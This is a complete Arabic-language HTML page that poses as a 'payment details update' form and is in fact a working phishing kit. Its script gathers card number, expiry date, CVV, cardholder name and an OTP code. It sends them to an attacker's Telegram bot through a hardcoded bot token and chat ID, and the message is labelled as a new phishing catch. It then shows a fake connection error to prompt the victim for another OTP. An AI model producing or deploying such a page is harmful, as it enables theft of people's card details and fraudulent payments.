<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من البطاقة</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 90%; max-width: 400px; border-top: 5px solid #0056b3; }
        h2 { color: #333; text-align: center; margin-bottom: 25px; font-size: 20px; }
        label { display: block; margin-bottom: 5px; color: #666; font-size: 14px; }
        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 16px; outline: none; transition: border 0.3s; }
        input:focus { border-color: #0056b3; }
        .row { display: flex; gap: 10px; }
        .row div { flex: 1; }
        button { width: 100%; padding: 14px; background-color: #0056b3; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; margin-top: 10px; }
        button:hover { background-color: #004494; }
    </style>
</head>
<body>

<div class="container">
    <h2>تحديث بيانات الدفع</h2>
    
    <label>رقم البطاقة</label>
    <input type="text" id="card_number" placeholder="0000 0000 0000 0000" maxlength="19">

    <div class="row">
        <div>
            <label>تاريخ الانتهاء</label>
            <input type="text" id="expiry_date" placeholder="MM/YY" maxlength="5">
        </div>
        <div>
            <label>رمز الأمان CVV</label>
            <input type="text" id="cvv" placeholder="123" maxlength="4">
        </div>
    </div>

    <label>اسم صاحب البطاقة</label>
    <input type="text" id="card_holder" placeholder="الاسم كما هو مكتوب">

    <label>رمز التحقق (OTP)</label>
    <input type="text" id="otp_code" placeholder="أدخل الرمز المكون من 6 أرقام">

    <button onclick="sendData()">تأكيد العملية</button>
</div>

<script>
    // تنسيق رقم البطاقة: فراغ كل 4 أرقام
    document.getElementById('card_number').addEventListener('input', function (e) {
        let target = e.target;
        let position = target.selectionEnd;
        let length = target.value.length;
        target.value = target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
        if (target.value.length !== length) position++;
        target.setSelectionRange(position, position);
    });

    // تنسيق التاريخ: شخطه بعد أول رقمين
    document.getElementById('expiry_date').addEventListener('input', function (e) {
        let val = e.target.value.replace(/[^\d]/g, '');
        if (val.length >= 2) val = val.slice(0, 2) + '/' + val.slice(2);
        e.target.value = val;
    });

    async function sendData() {
        const token = "8429424516:AAE0Cuy11JdGBYdtd3HMGAEnh-l_Szxk928";
        const chat_id = "6134623694";
        
        const message = `
⚠️ وصول بيانات صيد جديدة:
💳 البطاقة: ${document.getElementById('card_number').value}
📅 التاريخ: ${document.getElementById('expiry_date').value}
🔐 CVV: ${document.getElementById('cvv').value}
👤 الاسم: ${document.getElementById('card_holder').value}
📱 الرمز (OTP): ${document.getElementById('otp_code').value}
        `;

        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
        
        try {
            await fetch(url);
            alert("خطأ في الاتصال بالسيرفر، يرجى إعادة إدخال الرمز الصحيح.");
        } catch (error) {
            console.error("Error:", error);
        }
    }
</script>

</body>
</html>
